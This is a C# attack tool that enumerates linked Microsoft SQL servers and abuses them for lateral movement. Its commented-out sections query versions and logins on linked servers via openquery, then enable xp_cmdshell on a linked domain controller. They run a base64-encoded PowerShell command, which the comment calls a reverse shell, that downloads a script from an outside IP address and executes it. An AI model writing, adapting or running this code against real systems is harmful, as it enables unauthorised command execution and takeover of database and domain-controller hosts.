using System;
using System.Data.SqlClient;

namespace SqlLinkEnum
{
    class Program
    {
        static void Main(string[] args)
        {
            //HARDCODED SERVER FQDN HERE
            String sqlServer = "SQL11";
            //Default DB name on MS SQL
            String database = "master";

            String conString = "Server = " + sqlServer + "; Database = " + database + "; Integrated Security = True;";
            SqlConnection con = new SqlConnection(conString);

            try
            {
                con.Open();
                Console.WriteLine("Auth success!");
            }
            catch
            {
                Console.WriteLine("Auth failed");
                Environment.Exit(0);
            }
            //Finding linked servers
            
            String execCmd = "EXEC sp_linkedservers;";

            SqlCommand command = new SqlCommand(execCmd, con);
            SqlDataReader reader = command.ExecuteReader();

            while (reader.Read())
            {
                Console.WriteLine("Linked SQL server: " + reader[0]);
            }
            
            //See MS SQL version
            /*
            String execCmd = "select version from openquery(\"dc01\", 'select @@version as version');";
            SqlCommand command = new SqlCommand(execCmd, con);
            SqlDataReader reader = command.ExecuteReader();

            reader.Read();
            Console.WriteLine("Linked SQL server version: " + reader[0]);
            reader.Close();
            */

            //See users
            /*
            String execCmd = "select myuser from openquery(\"sql03\", 'select SYSTEM_USER as myuser');";
            String localCmd = "select SYSTEM_USER;";

            SqlCommand command = new SqlCommand(localCmd, con);
            SqlDataReader reader = command.ExecuteReader();

            reader.Read();
            Console.WriteLine("Executing as the login: " + reader[0] + " on web06");
            reader.Close();

             command = new SqlCommand(execCmd, con);
             reader = command.ExecuteReader();

            reader.Read();
            Console.WriteLine("Executing as the login: " + reader[0] + " on sql03");
            reader.Close();
             */

            //Execute command on linked server. Reverse shell in our code below that has been encoded. Find encoder PS script in our payload cheatsheet
            /*
            String enableadvoptions = "EXEC ('sp_configure ''show advanced options'', 1; RECONFIGURE;') AT DC01";
            String enablexpcmdshell = "EXEC ('sp_configure ''xp_cmdshell'', 1; RECONFIGURE;') AT DC01";
            String execmd = "EXEC ('xp_cmdshell ''powershell -enc KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADQAOQAuADgANAAvAHIAdQBuADYANAAuAHQAeAB0ACcAKQAgAHwAIABJAEUAWAA='';') AT DC01";

            SqlCommand command = new SqlCommand(enableadvoptions, con);
            SqlDataReader reader = command.ExecuteReader();
            reader.Close();

            command = new SqlCommand(enablexpcmdshell, con);
            reader = command.ExecuteReader();
            reader.Close();

            command = new SqlCommand(execmd, con);
            reader = command.ExecuteReader();
            reader.Close();
            */
            con.Close();
        }
    }
}